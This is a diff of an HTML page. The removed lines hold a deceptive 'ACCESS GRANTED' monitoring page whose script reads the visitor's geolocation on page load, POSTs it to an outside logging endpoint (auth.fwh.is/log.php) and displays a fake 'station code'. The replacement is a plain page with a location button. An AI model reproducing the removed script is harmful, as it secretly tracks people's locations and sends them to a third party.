@@ -1,56 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Monitoring Dashboard</title>
-    <style>
-        body {
-            background-color: #111;
-            color: #0f0;
-            font-family: monospace;
-            text-align: center;
-            margin-top: 100px;
-        }
-        .box {
-            display: inline-block;
-            border: 1px solid #0f0;
-            padding: 20px;
-            border-radius: 10px;
-        }
-    </style>
+  <title>Main Page</title>
 </head>
 <body>
-    <div class="box">
-        <h2>ACCESS GRANTED</h2>
-        <p>Station Verified</p>
-        <p>Access Station Located</p>
-        <p id="access-code"></p>
-    </div>
+  <h2>Welcome</h2>
+  <button onclick="getLocation()">Get My Location</button>
+  <p id="location"></p>
 
-    <script>
-        function sendLocation(lat, lng) {
-            fetch("https://auth.fwh.is/log.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: "lat=" + lat + "&lng=" + lng
-            });
-        }
-
-        function generateCode(lat, lng) {
-            // fake "station code" from coordinates
-            let code = "ST-" + Math.floor(Math.abs(lat * 1000)) + "-" + Math.floor(Math.abs(lng * 1000));
-            document.getElementById("access-code").innerText = code;
-        }
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                let lat = position.coords.latitude;
-                let lng = position.coords.longitude;
-                sendLocation(lat, lng);
-                generateCode(lat, lng);
-            }, function(error) {
-                document.getElementById("access-code").innerText = "ST-ERROR";
-            });
-        }
-    </script>
+  <script src="script.js"></script>
 </body>
 </html>
+
